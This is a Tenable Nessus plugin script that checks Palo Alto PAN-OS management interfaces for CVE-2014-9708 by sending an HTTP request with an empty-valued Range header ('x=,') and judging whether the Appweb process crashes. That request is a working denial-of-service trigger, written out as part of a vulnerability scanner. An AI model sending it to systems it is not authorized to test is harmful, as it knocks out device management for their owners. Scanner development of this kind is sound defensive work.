#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(96314);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2017/01/10 18:05:23 $");

  script_cve_id("CVE-2014-9708");
  script_bugtraq_id(73407);
  script_osvdb_id(120045);

  script_name(english:"Palo Alto Networks PAN-OS Management Interface Remote DoS (PAN-SA-2016-0027)");
  script_summary(english:"Attempts to terminate the Appweb process.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a denial of service vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Palo Alto Networks PAN-OS running on the remote host is affected
by a NULL pointer dereference flaw in the web management interface,
specifically in the parseRange() function within file rx.c, when
handling HTTP requests involving a Range header with an empty value.
An unauthenticated, remote attacker can exploit this, via a specially
crafted request, to cause the Appweb process for the management
interface to terminate, resulting in a denial of service condition.

Note that PAN-OS is reportedly affected by other vulnerabilities as
well; however, Nessus has not tested for these.");
  script_set_attribute(attribute:"see_also", value:"https://securityadvisories.paloaltonetworks.com/Home/Detail/60");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Palo Alto Networks PAN-OS version 5.0.20 / 5.1.13 /
6.0.15 / 6.1.15 / 7.0.11 / 7.1.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:X/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/10/31");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/10/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/01/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:paloaltonetworks:pan-os");
  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("palo_alto_webui_detect.nbin");
  script_require_keys("www/palo_alto_panos","Settings/ParanoidReport");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

# Use lack of response to flag vulnerability is not so reliable
if (report_paranoia < 2) audit(AUDIT_PARANOID);

# Make sure PAN-OS is detected
get_kb_item_or_exit("www/palo_alto_panos");

port = get_http_port(default:443, embedded:TRUE);

# Skip non-https port
if(get_port_transport(port) == ENCAPS_IP)
{
  exit(0, "Skip testing non-https port " + port + ".");  
}

res = http_send_recv3(
  method:"GET",
  item: '/',
  port:port,
  add_headers: make_array('Range', 'x=,'),
  exit_on_fail: FALSE
);

req = http_last_sent_request();

# Patched
if(res[0] =~ "^HTTP/[0-9.]+ 416") 
{
  audit(AUDIT_LISTEN_NOT_VULN, "web server", port);
}
# Vulnerable
# appweb terminates and restarts
else if(! res                           # seen in 6.1.x
     || res[0] =~ "^HTTP/[0-9.]+ 502")  # seen in 7.x
{

  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    request    : make_list(req),
    generic    : TRUE
  );
}
# Unexpected response status
else
{
  audit(AUDIT_RESP_BAD, port, 'an HTTP request. Response status:\n' + res[0]);
}

